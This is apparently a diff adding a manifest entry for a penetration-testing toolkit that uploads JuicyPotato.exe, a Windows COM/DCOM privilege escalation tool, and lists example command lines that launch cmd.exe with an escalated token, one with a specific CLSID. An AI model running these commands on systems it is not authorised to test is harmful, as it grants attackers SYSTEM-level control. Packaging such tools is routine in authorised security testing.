@@ -1,0 +1,16 @@
+schema = 1
+kind = "upload"
+description = "COM/DCOM privilege escalation for older Windows service accounts"
+tags = ["windows", "privesc", "potato", "impersonate"]
+upstream = "https://github.com/ohpe/juicy-potato"
+licence = "GPL-3.0"
+arch = "x86_64"
+examples = [
+  ".\\JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe -l 1337",
+  ".\\JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\"",
+]
+
+[[upload]]
+path = "files/JuicyPotato.exe"
+as = "JuicyPotato.exe"
+note = "x64; for older Windows; use a CLSID valid for the exact OS"
